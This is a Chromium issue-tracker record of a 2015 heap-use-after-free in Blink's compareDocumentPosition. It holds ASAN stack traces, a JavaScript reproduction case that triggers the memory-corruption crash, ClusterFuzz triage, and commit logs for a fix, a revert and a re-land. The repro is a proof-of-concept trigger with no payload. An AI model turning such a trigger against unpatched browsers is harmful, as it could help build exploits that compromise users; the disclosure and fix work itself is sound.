# Heap-use-after-free in blink::Node::compareDocumentPosition

| Field | Value |
|-------|-------|
| **Issue ID** | [40081161](https://issues.chromium.org/issues/40081161) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ta...@chromium.org |
| **Created** | 2015-01-12 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest chromium ASAN build. It requires --js-flags=--expose-gc. ASAN output:

=================================================================  

==28977==ERROR: AddressSanitizer: heap-use-after-free on address 0x60e00002cdc0 at pc 0x7f3e8b766119 bp 0x7fffae930350 sp 0x7fffae930348  

READ of size 8 at 0x60e00002cdc0 thread T0 (chrome)  

#0 0x7f3e8b766118 in compareDocumentPosition /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:1435  

#1 0x7f3e8b8c035e in add /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/DocumentOrderedList.cpp:50  

#2 0x7f3e8b7fd1bb in addStyleSheetCandidateNode /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/StyleEngine.cpp:331  

#3 0x7f3e8b79f490 in insertedInto /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ProcessingInstruction.cpp:280  

#4 0x7f3e8b62d9d0 in notifyNodeInsertedInternal /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:797  

#5 0x7f3e8b625610 in notifyNodeInserted /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:777  

#6 0x7f3e8b622a3f in updateTreeAfterInsertion /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1186  

#7 0x7f3e8b6200f7 in appendChild /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:734  

#8 0x7f3e8b61e668 in insertBefore /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:189  

#9 0x7f3e8b75a73a in insertBefore /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:465  

#10 0x7f3e8dc0e4c8 in insertBeforeMethodForMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:467  

#11 0x7f3e8b0d442e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#12 0x7f3e8a5b388f in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#13 0x7f3e4c4071ba (<unknown module>)  

#14 0x7f3e4c474c45 (<unknown module>)  

#15 0x7f3e4c47441c (<unknown module>)  

#16 0x7f3e4c4377bf (<unknown module>)  

#17 0x7f3e4c432270 (<unknown module>)  

#13 0x7f3e8a701337 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#14 0x7f3e8a51f7d6 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:4030  

#15 0x7f3e8d4bfbdf in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:405  

#16 0x7f3e8d43ca53 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:164  

#17 0x7f3e8d43c128 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:148  

#18 0x7f3e8d4a3579 in callListenerFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:99  

#19 0x7f3e8d47d41a in invokeEventHandler /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:125  

#20 0x7f3e8d47ce56 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:100  

#21 0x7f3e8d47cb02 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:85  

#22 0x7f3e8b880b67 in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:376  

#23 0x7f3e8b87f78b in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:312  

#24 0x7f3e8c430e1f in dispatchEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1673  

#25 0x7f3e8c42ecdf in dispatchLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1641  

#26 0x7f3e8c42f9b4 in dispatchWindowLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:490  

#27 0x7f3e8b675580 in implicitClose /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:2507  

#28 0x7f3e8c6945aa in checkCompleted /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:507  

#29 0x7f3e8c68fc41 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:429  

#30 0x7f3e8b69b987 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:4556  

#31 0x7f3e8bba6847 in end /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:808  

#32 0x7f3e8bbace72 in processParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:469  

#33 0x7f3e8bba8a0f in pumpPendingSpeculations /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:517  

#34 0x7f3e8bbaa88a in didReceiveParsedChunkFromBackgroundParser /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:338  

#35 0x7f3e8bd8d1aa in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:88 (discriminator 4)  

#36 0x7f3e9369c5ef in operator() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/Functional.h:513  

#37 0x7f3e8810b564 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#38 0x7f3e91c81976 in ProcessTaskFromWorkQueue /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/scheduler/task\_queue\_manager.cc:368  

#39 0x7f3e8810b564 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/callback.h:396  

#40 0x7f3e8804584c in RunTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:436  

#41 0x7f3e880468c5 in DeferOrRunPendingTask /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:446  

#42 0x7f3e8804cd0e in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_pump\_default.cc:32  

#43 0x7f3e88079508 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/run\_loop.cc:55  

#44 0x7f3e88043fc6 in base::MessageLoop::Run() /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../base/message\_loop/message\_loop.cc:298  

#45 0x7f3e91c6f743 in RendererMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/renderer/renderer\_main.cc:235  

#46 0x7f3e87fb4093 in RunZygote /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:347  

#47 0x7f3e87fb6416 in Run /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main\_runner.cc:800  

#48 0x7f3e87fb36c8 in ContentMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../content/app/content\_main.cc:19  

#49 0x7f3e870deea4 in ChromeMain /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../chrome/app/chrome\_main.cc:66  

#50 0x7f3e7cf20ec4 in \_\_libc\_start\_main /build/buildd/eglibc-2.19/csu/libc-start.c:287

0x60e00002cdc0 is located 0 bytes inside of 152-byte region [0x60e00002cdc0,0x60e00002ce58)  

freed by thread T0 (chrome) here:  

#0 0x7f3e870c0889 in \_\_interceptor\_free ??:?  

#1 0x7f3e8b61ca63 in removeDetachedChildrenInContainer /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ContainerNode.cpp:468 (discriminator 1)  

#2 0x7f3e8b64d187 in dispose /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:626  

#3 0x7f3e8b772f87 in removedLastRefToScope /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Node.cpp:2230  

#4 0x7f3e8a7b51f8 in PostGarbageCollectionProcessing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/global-handles.cc:368  

#5 0x7f3e8a7b5801 in PostMarkSweepProcessing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/global-handles.cc:849  

#6 0x7f3e8a807251 in PerformGarbageCollection /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:1140  

#7 0x7f3e8a805e34 in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap.cc:848  

#8 0x7f3e8a8056df in CollectGarbage /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/heap/heap-inl.h:583  

#9 0x7f3e8a52ea00 in RequestGarbageCollectionForTesting /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:6343  

#10 0x7f3e8b0d442e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#11 0x7f3e8a5b388f in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#12 0x7f3e4c4071ba (<unknown module>)  

#13 0x7f3e4c4748e1 (<unknown module>)  

#14 0x7f3e4c47441c (<unknown module>)  

#15 0x7f3e4c4377bf (<unknown module>)  

#16 0x7f3e4c432270 (<unknown module>)  

#12 0x7f3e8a701337 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#13 0x7f3e8a51f7d6 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:4030  

#14 0x7f3e8d4bfbdf in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:405  

#15 0x7f3e8d43ca53 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:164  

#16 0x7f3e8d43c128 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:148  

#17 0x7f3e8d4a3579 in callListenerFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:99  

#18 0x7f3e8d47d41a in invokeEventHandler /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:125  

#19 0x7f3e8d47ce56 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:100  

#20 0x7f3e8d47cb02 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:85  

#21 0x7f3e8b880b67 in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:376  

#22 0x7f3e8b87f78b in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:312  

#23 0x7f3e8c430e1f in dispatchEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1673  

#24 0x7f3e8c42ecdf in dispatchLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1641

previously allocated by thread T0 (chrome) here:  

#0 0x7f3e870c0b49 in \_\_interceptor\_malloc ??:?  

#1 0x7f3e8b7576ca in partitionAlloc /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/wtf/PartitionAlloc.h:477  

#2 0x7f3e8b799751 in create /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/ProcessingInstruction.cpp:55  

#3 0x7f3e8b65434e in createProcessingInstruction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:909  

#4 0x7f3e8daed890 in createProcessingInstructionMethod /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Document.cpp:3741  

#5 0x7f3e8b0d442e in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/arguments.cc:33  

#6 0x7f3e8a5b388f in HandleApiCallHelper<false> /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/builtins.cc:1139  

#7 0x7f3e4c4071ba (<unknown module>)  

#8 0x7f3e4c4746be (<unknown module>)  

#9 0x7f3e4c47441c (<unknown module>)  

#10 0x7f3e4c4377bf (<unknown module>)  

#11 0x7f3e4c432270 (<unknown module>)  

#7 0x7f3e8a701337 in Invoke /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/execution.cc:103  

#8 0x7f3e8a51f7d6 in Call /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../v8/src/api.cc:4030  

#9 0x7f3e8d4bfbdf in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:405  

#10 0x7f3e8d43ca53 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:164  

#11 0x7f3e8d43c128 in callFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:148  

#12 0x7f3e8d4a3579 in callListenerFunction /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp:99  

#13 0x7f3e8d47d41a in invokeEventHandler /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:125  

#14 0x7f3e8d47ce56 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:100  

#15 0x7f3e8d47cb02 in handleEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/bindings/core/v8/V8AbstractEventListener.cpp:85  

#16 0x7f3e8b880b67 in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:376  

#17 0x7f3e8b87f78b in fireEventListeners /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/events/EventTarget.cpp:312  

#18 0x7f3e8c430e1f in dispatchEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1673  

#19 0x7f3e8c42ecdf in dispatchLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:1641  

#20 0x7f3e8c42f9b4 in dispatchWindowLoadEvent /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/frame/LocalDOMWindow.cpp:490  

#21 0x7f3e8b675580 in implicitClose /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:2507  

#22 0x7f3e8c6945aa in checkCompleted /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:507  

#23 0x7f3e8c68fc41 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/loader/FrameLoader.cpp:429  

#24 0x7f3e8b69b987 in finishedParsing /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/../../third\_party/WebKit/Source/core/dom/Document.cpp:4556

SUMMARY: AddressSanitizer: heap-use-after-free ??:0 ??  

Shadow bytes around the buggy address:  

0x0c1c7fffd960: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c1c7fffd970: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c1c7fffd980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c1c7fffd990: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00  

0x0c1c7fffd9a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa  

=>0x0c1c7fffd9b0: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd  

0x0c1c7fffd9c0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa  

0x0c1c7fffd9d0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1c7fffd9e0: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa  

0x0c1c7fffd9f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c1c7fffda00: 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==28977==ABORTING  

[28988:28989:0112/132140:ERROR:channel.cc(305)] RawChannel read error (connection broken)

**VERSION**  

Chrome Version: asan-linux-release-311005

**REPRODUCTION CASE**

<script>
function start() {
o5=document.cloneNode(false);
o7=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o12=o7.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o34=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o5.insertBefore(o34,o5.firstChild);
o37=document.documentElement;
o12.appendChild(o37);
o5=null;
o34=null;
o51=o37.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
gc();
o60=o51.cloneNode(true);
o78=document.createElementNS('http://www.w3.org/2000/svg','set');
o83=o78.cloneNode(false);
o60.appendChild(o83);
o98=o83.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o116=o98.ownerDocument;
o119=o116.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o116.insertBefore(o119,o116.firstChild);
setTimeout('location.reload();',200);
}
</script>
<body onload="start()"></body>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### in...@chromium.org (2015-01-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-12)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5590218995400704

### cl...@chromium.org (2015-01-12)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5590218995400704

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000090680
Crash State:
  blink::Node::compareDocumentPosition
  blink::DocumentOrderedList::add
  blink::StyleEngine::addStyleSheetCandidateNode
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=304972:305118

Minimized Testcase (0.94 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv9438e7OvhtOwgfI2PVXbjNEK-jAz9JvmDcIfZix__uIc2Yi2kZv-GKkECN9-1HXof1hDBYLo7Tc4p2x-haf4DyJ2xL1NKkUEfXas-ChCF_EsbfhbzyGCigP3r6FuVpvjT8-PPcByi-7ZGSSpnUH-g60Rp8oHw
<script>
function start() {
o5=document.cloneNode(false);
o7=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o12=o7.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o34=o5.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o5.insertBefore(o34,o5.firstChild);
o37=document.documentElement;
o12.appendChild(o37);
o5=null;
o34=null;
o51=o37.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
gc();
o60=o51.cloneNode(true);
o78=document.createElementNS('http://www.w3.org/2000/svg','set');
o83=o78.cloneNode(false);
o60.appendChild(o83);
o98=o83.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o116=o98.ownerDocument;
o119=o116.createProcessingInstruction('xml-stylesheet', 'href="fail.css" type="text/css"');
o116.insertBefore(o119,o116.firstChild);
setTimeout('location.reload();',200);
}
</script>
<body onload="start()"</body>




### in...@chromium.org (2015-01-12)

Author: tasak@google.com 
Component: blink
Changelist: https://chromium.googlesource.com/chromium/blink.git/+/e291a42155aa200ec1d652fccdd90190bfa61b8e
Time: Thu Nov 20 04:58:41 2014
Lines 278 of file ProcessingInstruction.cpp which potentially caused crash are changed in this cl (frame #3, "blink::ProcessingInstruction::insertedInto").

File StyleEngine.cpp is changed in this cl (and is part of stack frame #2, "blink::StyleEngine::addStyleSheetCandidateNode")
Minimum distance from crash line to modified line: 0. (file: ProcessingInstruction.cpp, crashed on: 278, modified: 278).

This might be related to the other two StyleEngine bugs.

### cl...@chromium.org (2015-01-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-13)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### ta...@chromium.org (2015-01-13)

I've just finished investigating this issue.
I think, we should not update StyleEngine after document is detached.


### ta...@chromium.org (2015-01-13)

I created a patch for this:
https://codereview.chromium.org/853473003/

I'm now looking at trybots' results, and creating a layout test.


### cl...@chromium.org (2015-01-27)

tasak@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### bu...@chromium.org (2015-01-28)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189093

------------------------------------------------------------------
r189093 | tasak@google.com | 2015-01-28T06:09:35.318993Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.h?r1=189093&r2=189092&pathrev=189093
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/StyleEngine.cpp?r1=189093&r2=189092&pathrev=189093
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document.html?r1=189093&r2=189092&pathrev=189093
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document-expected.txt?r1=189093&r2=189092&pathrev=189093

Should not add a new style candidate to StyleEngine after document is detached.

Style elements could be destroyed without removedFrom. So StyleEngine could have stale pointers in its document ordered list.
If a new style candidate node is added to StyleEngine, the stale pointers (pointing to nodes) will be used, i.e. compareDocumentPosition. This causes heap-use-after-free.

BUG=448006
TEST=fast/css/should-not-insert-stylesheet-into-detached-document.html

Review URL: https://codereview.chromium.org/853473003
-----------------------------------------------------------------

### in...@chromium.org (2015-01-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-28)

[Empty comment from Monorail migration]

### bu...@chromium.org (2015-01-29)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189157

------------------------------------------------------------------
r189157 | amineer@chromium.org | 2015-01-29T02:59:35.559903Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/2290/Source/core/dom/Document.h?r1=189157&r2=189156&pathrev=189157
   M http://src.chromium.org/viewvc/blink/branches/chromium/2290/Source/core/dom/StyleEngine.cpp?r1=189157&r2=189156&pathrev=189157
   D http://src.chromium.org/viewvc/blink/branches/chromium/2290/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document.html?r1=189157&r2=189156&pathrev=189157
   D http://src.chromium.org/viewvc/blink/branches/chromium/2290/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document-expected.txt?r1=189157&r2=189156&pathrev=189157

Revert 189093 "Should not add a new style candidate to StyleEngi..."

> Should not add a new style candidate to StyleEngine after document is detached.
> 
> Style elements could be destroyed without removedFrom. So StyleEngine could have stale pointers in its document ordered list.
> If a new style candidate node is added to StyleEngine, the stale pointers (pointing to nodes) will be used, i.e. compareDocumentPosition. This causes heap-use-after-free.
> 
> BUG=448006
> TEST=fast/css/should-not-insert-stylesheet-into-detached-document.html
> 
> Review URL: https://codereview.chromium.org/853473003

Reverting on branch only to get a clean canary out.
BUG=453154

TBR=tasak@google.com

Review URL: https://codereview.chromium.org/881403004
-----------------------------------------------------------------

### bu...@chromium.org (2015-01-29)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189160

------------------------------------------------------------------
r189160 | tasak@google.com | 2015-01-29T03:16:01.970677Z

Changed paths:
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document-expected.txt?r1=189160&r2=189159&pathrev=189160
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.h?r1=189160&r2=189159&pathrev=189160
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/StyleEngine.cpp?r1=189160&r2=189159&pathrev=189160
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document.html?r1=189160&r2=189159&pathrev=189160

Revert "Should not add a new style candidate to StyleEngine after document is detached."

The patch reveals another serious crashes, crbug.com/453154. Need to fix the crashes too.

BUG=448006
TBR=haraken@chromium.org
NOTRY=true

Review URL: https://codereview.chromium.org/874093003
-----------------------------------------------------------------

### ta...@chromium.org (2015-01-29)

Reopened, because of reverting the patch (for fixing crbug.com/453154).



### bu...@chromium.org (2015-02-04)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189451

------------------------------------------------------------------
r189451 | tasak@google.com | 2015-02-04T02:20:01.336416Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/StyleEngine.cpp?r1=189451&r2=189450&pathrev=189451
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document.html?r1=189451&r2=189450&pathrev=189451
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/css/should-not-insert-stylesheet-into-detached-document-expected.txt?r1=189451&r2=189450&pathrev=189451
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/Document.h?r1=189451&r2=189450&pathrev=189451

